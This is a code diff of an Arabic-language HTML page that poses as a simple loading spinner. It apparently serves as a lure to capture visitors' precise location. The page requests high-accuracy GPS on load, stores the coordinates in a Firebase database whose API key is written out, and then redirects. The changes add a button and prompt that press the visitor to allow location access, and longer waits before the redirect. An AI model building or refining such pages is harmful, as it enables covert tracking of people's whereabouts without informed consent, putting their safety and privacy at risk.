@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -17,7 +17,8 @@
         }
         .loader { text-align: center; }
         .spinner {
-            width: 40px; height: 40px;
+            width: 40px;
+            height: 40px;
             border: 4px solid rgba(255,255,255,0.3);
             border-top: 4px solid #8ab4f8;
             border-radius: 50%;
@@ -25,17 +26,29 @@
             margin: 0 auto 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .message { font-size: 14px; color: #aaa; }
+        .message { font-size: 14px; color: #aaa; margin-bottom: 15px; }
+        .btn {
+            background: #8ab4f8;
+            color: #202124;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            display: none;
+        }
+        .btn:hover { background: #aecbfa; }
     </style>
 </head>
 <body>
     <div class="loader">
         <div class="spinner"></div>
         <div class="message" id="status">جاري التجهيز...</div>
+        <button class="btn" id="retryBtn" onclick="requestLocation()">السماح بالوصول للموقع</button>
     </div>
 
     <script>
-
+        // بيانات مشروعك - تم وضعها يدويًا
         const firebaseConfig = {
             apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
             databaseURL: "https://imggps-default-rtdb.firebaseio.com",
@@ -82,29 +95,47 @@
             const lat = pos.coords.latitude.toFixed(7);
             const lng = pos.coords.longitude.toFixed(7);
             const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : 'N/A';
-            document.getElementById('status').textContent = 'تم تحميل ...';
+
+            document.getElementById('status').textContent = 'تم تحديد الموقع بنجاح...';
+            document.getElementById('retryBtn').style.display = 'none';
             saveData(lat, lng, acc);
         }
 
         function handleError(err) {
             console.warn('Geolocation error:', err.message);
-            document.getElementById('status').textContent =   Errror  ...';
-            setTimeout(redirect, 1500);
+            document.getElementById('status').textContent = 'يرجى السماح بالوصول للموقع للمتابعة';
+            document.getElementById('retryBtn').style.display = 'inline-block';
+
+            // إعادة التوجيه بعد مهلة إذا رفض المستخدم
+            setTimeout(redirect, 8000);
         }
 
-        if (navigator.geolocation) {
-            document.getElementById('status').textContent = 'جاري تحميل الموقع...';
+        function requestLocation() {
+            document.getElementById('status').textContent = 'جاري طلب الموقع...';
+            document.getElementById('retryBtn').style.display = 'none';
+
+            if (!navigator.geolocation) {
+                document.getElementById('status').textContent = 'المتصفح لا يدعم تحديد الموقع';
+                setTimeout(redirect, 2000);
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(
                 handlePosition,
                 handleError,
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                {
+                    enableHighAccuracy: true,  // محاولة استخدام GPS
+                    timeout: 10000,            // مهلة أطول قليلاً
+                    maximumAge: 0              // لا تستخدم موقع قديم
+                }
             );
-        } else {
-            setTimeout(redirect, 1000);
         }
 
-        // احتياط: إعادة توجيه بعد 7 ثوانٍ إذا لم يكتمل شيء
-        setTimeout(redirect, 7000);
+        // بدء الطلب تلقائيًا عند تحميل الصفحة
+        requestLocation();
+
+        // احتياط: إعادة توجيه بعد 12 ثانية إذا لم يكتمل شيء
+        setTimeout(redirect, 12000);
     </script>
 </body>
 </html>
